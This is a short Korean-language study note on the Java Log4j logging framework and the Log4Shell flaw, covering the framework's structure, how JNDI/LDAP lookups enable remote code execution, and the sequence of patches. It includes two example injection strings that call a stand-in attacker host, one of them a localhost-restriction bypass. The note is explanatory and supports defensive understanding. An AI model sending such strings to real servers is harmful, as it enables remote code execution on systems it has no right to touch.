# log4j와 Log4Shell
## log4j
- 자바 진영에서 사용하는 로그 기록 프레임워크
- 속도에 최적화 되어 있으며 Thread-safe 하다.
- Trace, Debug, Info, Warn, Error, Fatal의 6가지 장애 레벨을 사용
- 출력을 파일, 콘솔, 원격서버, 심지어 이메일로까지 보낼 수 있음
- 한국 정부에서 사용하는 전자정부프레임워크에서도 사용중임

### 구조
- Logger: 로깅 메세지를 Appender에 전달, 로그레벨을 가지고 있어 로그의 출력 여부를 결정
- Appender: 로그의 출력 위치를 결정(예: 파일, 콘솔, DB)
- Layout: 어떤 형식으로 출력할 것인지 
  - 예를 들어 ```<param name="ConversionPattern" value="%-5p: %c - %m%n" />``` 라는 xml 태그는 순서대로 로그레벨, 클래스 구조, 로그내용을 출력한 뒤 개행하라는 뜻이다.

## Log4Shell
- 기본적으로는 RCE(원격 코드 실행)으로 인해 발생하는 보안 취약점이다
- Log4j 문법에서는 JNDI와 LDAP를 사용할 수 있다
  - JNDI는 자바 네이밍 디렉토리 인터페이스로, 디렉토리를 통해 자바 객체형태의 데이터를 찾을 수 있게 해준다
  - LDAP는 Lightweight Directory Access Protocol의 약자로, 네트워크상에서 조직이나 개인, 파일, 디바이스 등을 찾아볼 수 있게 해주는 소프트웨어 프로토콜이다.
- 이 둘을 조합하여 ${jndi:ldap://evilhost.com/a} 같은 식으로 사용자가 보낸 문자열을 로그에 넣으면 Log4j는 이 URL을 호출해버림
- 즉, 서버에서 원격으로 코드를 실행시켜버릴 수 있는 취약점인 것
- 예를 들어, 마인크래프트의 채팅창에 위와 같은 방식의 채팅을 치면, 서버에 원격으로 코드를 실행시킬 수 있음
- 이와 같은 문제를 애플, 테슬라 같은 대기업과 각국 전자 정부 시스템에서 겪었음

### 사건 전개
- 2021년 11월 24일, 버전 2.14에서 제로데이 이슈로 발견됨
- 버전 2.15이 공개되었지만, DoS(서비스 거절) 공격에 대한 취약점이 여전히 존재했고, RCE를 완전히 막지 못함
  - 유저의 URL 호출을 localhost로 한정했으나 ${jndi:ldap://127.0.0.1#evilhost.com:1389/a}같은 식으로 여전히 다른 서버의 URL을 호출 할 수 있었음
- 버전 2.16이 공개되었지만 이번엔 무한 재귀 문제가 발생할 수 있게 되었음
  - 이로인해 스택 오버플로가 발생하여 서버가 다운될 수 있었음
- 버전 2.17이 공개되었지만 새로운 취약점이 발견됨
- 현재 버전 2.17.1 이상을 사용할 경우 안전할 것으로 사료됨
- 참고로 현재 아직도 업데이트를 안한 경우에 사용하는 1.2버전에서도 같은 이슈가 존재함
  - 이 경우엔 JMSAppender를 사용하지 않도록 하면 안전함